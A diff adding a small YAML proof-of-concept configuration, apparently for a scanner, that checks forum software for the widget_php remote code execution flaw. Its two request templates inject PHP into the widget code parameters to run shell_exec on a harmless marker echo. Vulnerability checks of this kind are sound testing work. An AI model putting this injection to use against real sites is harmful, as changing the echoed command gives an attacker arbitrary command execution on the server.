@@ -1,0 +1,14 @@
+#config
+headers:
+  User-Agent:
+    Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11
+Poc_First:
+  routestring:
+    ajax/render/widget_php
+  widgetConfig[code]:
+    echo shell_exec('echo fc5e038d38a57032085441e7fe7010b0'); exit;
+Poc_Second:
+  subWidgets[0][template]:
+    widget_php
+  subWidgets[0][config][code]:
+    echo shell_exec('echo fc5e038d38a57032085441e7fe7010b0'); exit;
